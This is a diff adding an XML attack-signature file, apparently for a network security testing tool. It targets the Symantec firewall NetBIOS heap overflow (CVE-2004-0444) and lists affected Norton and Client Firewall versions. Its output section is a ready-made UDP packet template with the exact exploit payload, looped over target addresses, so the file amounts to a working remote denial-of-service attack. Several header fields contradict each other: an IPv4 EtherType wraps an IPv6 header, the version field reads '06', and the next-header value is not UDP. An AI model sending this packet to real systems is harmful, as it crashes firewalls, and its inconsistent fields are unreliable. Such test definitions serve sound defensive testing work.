@@ -1,0 +1,96 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Symantec Firewall NetBIOS Buffer Overflow (IPv6 Version)"/>
+    <EngDesc display="true" value="This threat sends a corrupted NetBIOS answer causing a heap overflow in Symantec's Firewall software.  In order for this threat to work the user must target an open, listening UDP port (for instance, port 137) and allow this traffic through the built in firewall. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Corruption"/>
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="NETBIOS_NS/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Firewall"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Symantec"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Client_Firewall"/>
+      <item value="Client_Security"/>
+      <item value="Norton_Antispam"/>
+      <item value="Norton_Internet_Security"/>
+      <item value="Norton_Personal_Firewall"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Client_Firewall_5.01"/>
+      <item value="Client_Firewall_5.1.1"/>
+      <item value="Client_Security_1.0"/>
+      <item value="Client_Security_1.1"/>
+      <item value="Client_Security_2.0"/>
+      <item value="(SCF"/>
+      <item value="7.1)"/>
+      <item value="Norton_Antispam_2004"/>
+      <item value="Norton_Internet_Security_2002"/>
+      <item value="Norton_Internet_Security_2003"/>
+      <item value="Norton_Internet_Security_2004"/>
+      <item value="Norton_Internet_Security_Professional_2002"/>
+      <item value="Norton_Internet_Security_Professional_2003"/>
+      <item value="Norton_Internet_Security_Professional_2004"/>
+      <item value="Norton_Personal_Firewall_2002"/>
+      <item value="Norton_Personal_Firewall_2003"/>
+      <item value="Norton_Personal_Firewall_2004"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.eeye.com/html/research/advisories/AD20040512C"/>
+    <CVEID display="true" value="CVE-2004-0444"/>
+    <bugtraqID display="true" value="10335"/>
+    <OSVDB display="true" value="6101"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="a32c63e2fdf50270f411acee2df8b01a"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="1211993996"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X88\X6d\X80\X00\X00\X00\X00\X02\X00\X00\X00\X00\X20\X45\X50\X46\X4b\X46\X4a\X45\X4e\X45\X42\X45\X4f\X45\X45\X45\X4a\X46\X46\X46\X44\X43\X41\X43\X41\X43\X41\X43\X41\X43\X41\X41\X41\X00\X00\X20\X00\X01\X00\X04\X93\Xe0\X00\X06\X60\X00\Xc0\Xa8\X02\X79"/>
+    <Created value="1139461848" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="NETBIOS_NSdestPort" type="ImperfectControls.Port" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="D"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A"/>
+    <for index="B"/>
+    <for index="C"/>
+    <for index="D"/>
+    <for index="E"/>
+    <for index="F"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <UDP srcPort="137" destPort="$NETBIOS_NSdestPort" checksum="" length="" Payload="886d80000000000200000000204550464b464a454e4542454f4545454a464646444341434143414341434141410000200001000493e000066000c0a80279"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+</threatSignature>
